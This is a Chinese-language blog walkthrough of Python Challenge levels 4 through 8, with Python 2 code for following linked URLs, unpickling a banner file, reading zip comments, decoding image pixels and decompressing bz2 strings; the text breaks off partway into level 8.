<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;linkedlist(times=1,&#160;param=&#34;123456&#34;):&#10;&#160;&#160;&#160;&#160;try:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;url&#160;=&#160;&#34;?nothing=&#34;.join([&#34;http://www.pythonchallenge.com/pc/def/linkedlist.php&#34;,&#160;param])&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;page_source&#160;=&#160;requests.get(url).text&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;next_param&#160;=&#160;re.findall(&#34;and&#160;the&#160;next&#160;nothing&#160;is&#160;([0-9]+)&#34;,&#160;page_source)[0]&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;%d&#160;-&#62;&#160;%s&#34;&#160;%&#160;(times,&#160;next_param)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;times&#160;+=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linkedlist(times,&#160;next_param)&#10;&#160;&#160;&#160;&#160;#&#160;&#21305;&#37197;&#19981;&#21040;&#36339;&#21040;&#24322;&#24120;&#10;&#160;&#160;&#160;&#160;except&#160;IndexError:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;the&#160;right&#160;url&#160;is&#160;:&#160;%s&#34;&#160;%&#160;url&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;page_source&#10;&#62;&#62;&#62;&#160;the&#160;right&#160;url&#160;is&#160;:&#160;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=66831&#10;&#160;&#160;&#160;&#160;peak.html</span><br></pre></td></tr></table></figure>
<h3 id="python_challenge_5"><a href="http://www.pythonchallenge.com/pc/def/peak.html" target="_blank" rel="external">python challenge 5</a></h3><p><code>http://www.pythonchallenge.com/pc/def/peak.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-5.jpg" alt="5"><br>这关估计卡了不少人，从页面源码只能得到banner.p文件地址,即<a href="http://www.pythonchallenge.com/pc/def/banner.p" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/banner.p</a><br>跟我一样没有用过pickle模块的一般都解不出来，看到文件内容也是没有头绪的，通过上网查了资料才知道如何解题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#160;pickle&#27169;&#22359;&#30340;&#20351;&#29992;&#10;def&#160;peak():&#10;&#160;&#160;&#160;&#160;import&#160;pickle&#10;&#160;&#160;&#160;&#160;page_source&#160;=&#160;requests.get(&#34;http://www.pythonchallenge.com/pc/def/peak.html&#34;).text&#10;&#160;&#160;&#160;&#160;banner_name&#160;=&#160;re.findall(r&#34;&#34;,&#160;page_source)[0]&#10;&#160;&#160;&#160;&#160;banner_url&#160;=&#160;&#34;&#34;.join([&#34;http://www.pythonchallenge.com/pc/def/&#34;,&#160;banner_name])&#10;&#160;&#160;&#160;&#160;banner_content&#160;=&#160;requests.get(banner_url).text&#10;&#160;&#160;&#160;&#160;#&#160;print&#160;banner_content&#10;&#160;&#160;&#160;&#160;banner_obj&#160;=&#160;pickle.loads(banner_content)&#10;&#160;&#160;&#160;&#160;for&#160;list_&#160;in&#160;banner_obj:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;&#34;.join([tuple_[0]&#160;*&#160;tuple_[1]&#160;for&#160;tuple_&#160;in&#160;list_])&#10;&#10;&#62;&#62;&#62;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;#####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;###&#160;&#160;&#160;##&#160;&#160;&#160;&#160;####&#160;#######&#160;&#160;&#160;&#160;&#160;##&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;####&#160;#######&#160;&#160;&#160;####&#160;#######&#160;&#160;&#160;&#160;&#160;###&#160;&#160;###&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;###&#160;&#160;#####&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###&#160;&#160;&#160;####&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;&#160;####&#160;&#160;#####&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;####&#160;&#10;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#10;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;####&#160;&#10;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;##&#160;&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;####&#160;&#10;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;##########&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;##############&#160;&#160;####&#160;&#10;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;####&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;####&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;####&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;##&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;###&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;##&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;##&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;###########&#160;&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;####&#160;&#160;&#160;&#160;&#160;####&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;##&#160;&#160;&#160;&#160;####&#160;&#10;&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;######&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;&#160;##&#160;&#160;&#160;&#160;####&#160;######&#160;&#160;&#160;&#160;###########&#160;&#160;&#160;&#160;#####&#160;&#160;&#160;&#160;&#160;&#160;###&#160;&#160;&#160;&#160;&#160;&#160;######</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_6"><a href="http://www.pythonchallenge.com/pc/def/channel.html" target="_blank" rel="external">python challenge 6</a></h3><p><code>http://www.pythonchallenge.com/pc/def/channel.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-6.jpg" alt="6"><br>一张拉链图片，看了源码也没有任何提示，只知道是要捐赠。。。<br>再仔细看第一行，  ，将html变zip<br>下载channel.zip文件，链接：<a href="http://www.pythonchallenge.com/pc/def/channel.zip" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/channel.zip</a><br>下载完成后解压，和第四题一样，只不过多了文件遍历操作，遍历从任意文件开始都可以。<br>我这里从os.walk遍历到的文件列表中第一个文件开始遍历。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;channel():&#10;&#160;&#160;&#160;&#160;import&#160;os&#10;&#10;&#160;&#160;&#160;&#160;root_path&#160;=&#160;&#34;D:\\downloads\\channel&#34;&#10;&#10;&#160;&#160;&#160;&#160;def&#160;linked_file(times=1,&#160;file_name=&#34;123456&#34;):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;try:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file_path&#160;=&#160;&#34;\\&#34;.join([root_path,&#160;file_name])&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file_content&#160;=&#160;open(file_path,&#160;&#34;r+&#34;).read()&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;next_file_name&#160;=&#160;re.findall(&#34;Next&#160;nothing&#160;is&#160;([0-9]+)&#34;,&#160;file_content)[0]&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;%d&#160;-&#62;&#160;%s.txt&#34;&#160;%&#160;(times,&#160;next_file_name)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;times&#160;+=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linked_file(times,&#160;&#34;&#34;.join([next_file_name,&#160;&#34;.txt&#34;]))&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;#&#160;&#21305;&#37197;&#19981;&#21040;&#36339;&#21040;&#24322;&#24120;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;except&#160;IndexError:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;the&#160;right&#160;link&#160;in&#160;file&#160;:&#160;%s&#34;&#160;%&#160;file_name&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;file_content&#10;&#10;&#160;&#160;&#160;&#160;for&#160;root,&#160;dirs,&#160;files&#160;in&#160;os.walk(root_path):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;file_&#160;in&#160;files:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linked_file(1,&#160;file_)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;break&#10;&#62;&#62;&#62;&#160;the&#160;right&#160;link&#160;in&#160;file&#160;:&#160;46145.txt&#10;&#160;&#160;&#160;&#160;Collect&#160;the&#160;comments.</span><br></pre></td></tr></table></figure>
<p>坑爹的答案，让我收集注释，那么答案在哪里。。。<br>再仔细翻解压的文件，发现里边有个readme.txt !!!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome&#160;to&#160;my&#160;zipped&#160;list.&#10;hint1:&#160;start&#160;from&#160;90052&#10;hint2:&#160;answer&#160;is&#160;inside&#160;the&#160;zip</span><br></pre></td></tr></table></figure></p>
<p>将代码中linked<em>file(1, file</em>)改为linked_file(1, “90052.txt”)<br>最后输出答案一样！！！</p>
<p>难道是我的解压方式不对？！？！<br>调用zipfile模块,使用ZipInfo类获取comment<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;channel():&#10;&#160;&#160;&#160;&#160;import&#160;zipfile&#10;&#160;&#160;&#160;&#160;zf&#160;=&#160;zipfile.ZipFile(&#34;D:\\downloads\\channel.zip&#34;)&#10;&#160;&#160;&#160;&#160;result&#160;=&#160;[]&#10;&#160;&#160;&#160;&#160;begin_file_name&#160;=&#160;&#34;90052.txt&#34;&#10;&#160;&#160;&#160;&#160;while&#160;True:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;z_info&#160;=&#160;zf.getinfo(begin_file_name)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;f&#160;=&#160;zf.open(z_info)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;f_content&#160;=&#160;f.read()&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;next_file_name&#160;=&#160;re.findall(r&#34;Next&#160;nothing&#160;is&#160;([0-9]+)&#34;,&#160;f_content)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;f.close()&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;result.append(z_info.comment)&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;next_file_name:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;begin_file_name&#160;=&#160;&#34;%s.txt&#34;&#160;%&#160;next_file_name[0]&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;else:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;break&#10;&#10;&#160;&#160;&#160;&#160;print&#160;&#34;&#34;.join(result)&#10;&#62;&#62;&#62;&#10;****************************************************************&#10;****************************************************************&#10;**&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;XX&#160;&#160;&#160;&#160;&#160;&#160;YYYY&#160;&#160;&#160;&#160;GG&#160;&#160;&#160;&#160;GG&#160;&#160;EEEEEE&#160;NN&#160;&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;&#160;XXXXXX&#160;&#160;&#160;YYYYYY&#160;&#160;&#160;GG&#160;&#160;&#160;GG&#160;&#160;&#160;EEEEEE&#160;&#160;NN&#160;&#160;&#160;&#160;NN&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;XXX&#160;&#160;XXX&#160;YYY&#160;&#160;&#160;YY&#160;&#160;GG&#160;GG&#160;&#160;&#160;&#160;&#160;EE&#160;&#160;&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;NN&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OOOOOOOO&#160;XX&#160;&#160;&#160;&#160;XX&#160;YY&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GGG&#160;&#160;&#160;&#160;&#160;&#160;&#160;EEEEE&#160;&#160;&#160;&#160;&#160;NNNN&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OOOOOOOO&#160;XX&#160;&#160;&#160;&#160;XX&#160;YY&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GGG&#160;&#160;&#160;&#160;&#160;&#160;&#160;EEEEE&#160;&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;XXX&#160;&#160;XXX&#160;YYY&#160;&#160;&#160;YY&#160;&#160;GG&#160;GG&#160;&#160;&#160;&#160;&#160;EE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;&#160;XXXXXX&#160;&#160;&#160;YYYYYY&#160;&#160;&#160;GG&#160;&#160;&#160;GG&#160;&#160;&#160;EEEEEE&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;OO&#160;&#160;&#160;&#160;XX&#160;&#160;&#160;&#160;&#160;&#160;YYYY&#160;&#160;&#160;&#160;GG&#160;&#160;&#160;&#160;GG&#160;&#160;EEEEEE&#160;&#160;&#160;&#160;&#160;NN&#160;&#160;&#160;&#160;&#160;&#160;**&#10;**&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;**&#10;****************************************************************&#10;&#160;**************************************************************</span><br></pre></td></tr></table></figure></p>
<p>将url改为hockey.html，竟然有小关卡！！！<br>it’s in the air. look at the letters<br>赶紧开开脑洞，空气中是什么，氧气啊！<br>oxygen :)</p>
<h3 id="python_challenge_7"><a href="http://www.pythonchallenge.com/pc/def/oxygen.html" target="_blank" rel="external">python challenge 7</a></h3><p><code>http://www.pythonchallenge.com/pc/def/oxygen.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-7.jpg" alt="7"><br>这个题需要解析图片，之前没有接触到因此是查资料完成。<br>1.需要安装<a href="http://www.pythonware.com/products/pil/#pil117" target="_blank" rel="external">PIL库</a><br>2.截取黑白部分<br>3.将RGBA格式的像素每个像素值按照L8位黑白像素的格式转成一个acsii码值<br>4.将最后获得的答案转换为ASCII码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;oxygen():&#10;&#160;&#160;&#160;&#160;from&#160;PIL&#160;import&#160;Image&#10;&#160;&#160;&#160;&#160;img&#160;=&#160;Image.open(&#34;oxygen.png&#34;)&#10;&#160;&#160;&#160;&#160;#&#160;left,top,right,bottom&#10;&#160;&#160;&#160;&#160;box&#160;=&#160;(0,&#160;43,&#160;608,&#160;52)&#10;&#160;&#160;&#160;&#160;belt&#160;=&#160;img.crop(box)&#10;&#160;&#160;&#160;&#160;#&#160;get&#160;a&#160;sequence&#160;object&#160;containing&#160;pixel&#160;values&#10;&#160;&#160;&#160;&#160;pixels&#160;=&#160;belt.getdata()&#10;&#160;&#160;&#160;&#160;print(&#39;mode:&#160;%s&#39;&#160;%&#160;img.mode)&#10;&#160;&#160;&#160;&#160;print(&#39;amount&#160;of&#160;pixel:&#160;%d&#39;&#160;%&#160;len(pixels))&#10;&#160;&#160;&#160;&#160;#&#160;print(pixels[0])&#10;&#10;&#160;&#160;&#160;&#160;#&#160;convert&#160;mode&#160;RGBA&#160;to&#160;mode&#160;L&#10;&#160;&#160;&#160;&#160;l_belt&#160;=&#160;belt.convert(&#39;L&#39;)&#10;&#160;&#160;&#160;&#160;#&#160;get&#160;a&#160;sequence&#160;object&#160;containing&#160;pixel&#160;values&#10;&#160;&#160;&#160;&#160;l_pixels&#160;=&#160;l_belt.getdata()&#10;&#10;&#160;&#160;&#160;&#160;result&#160;=&#160;[]&#10;&#160;&#160;&#160;&#160;for&#160;i&#160;in&#160;range(0,&#160;608,&#160;7):&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;result.append(chr(l_pixels[i]))&#10;&#10;&#160;&#160;&#160;&#160;print&#160;&#39;&#39;.join(result)&#10;&#160;&#160;&#160;&#160;&#10;&#62;&#62;&#62;&#160;smart&#160;guy,&#160;you&#160;made&#160;it.&#160;the&#160;next&#160;level&#160;is&#160;[105,&#160;110,&#160;116,&#160;101,&#160;103,&#160;114,&#160;105,&#160;116,&#160;121]</span><br></pre></td></tr></table></figure>
<p>最后将[105, 110, 116, 101, 103, 114, 105, 116, 121]转为ascii即为答案:integrity</p>
<h3 id="python_challenge_8"><a href="http://www.pythonchallenge.com/pc/def/integrity.html" target="_blank" rel="external">python challenge 8</a></h3><p><code>http://www.pythonchallenge.com/pc/def/integrity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-8.jpg" alt="8"><br>点击中间的蜜蜂弹出要求输入用户名和密码<br>然后看下源码，找到了用户名密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">un:&#160;&#39;BZh91AY&#38;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00&#160;\x00!\x9ah3M\x07&#60;]\xc9\x14\xe1BA\x06\xbe\x084&#39;&#10;pw:&#160;&#39;BZh91AY&#38;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$&#160;\x00!\x9ah3M\x13&#60;]\xc9\x14\xe1BBP\x91\xf08&#39;</span><br></pre></td></tr></table></figure></p>
<p>看下加密字符串特征BZ开头，猜测是否为bz2压缩，尝试成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 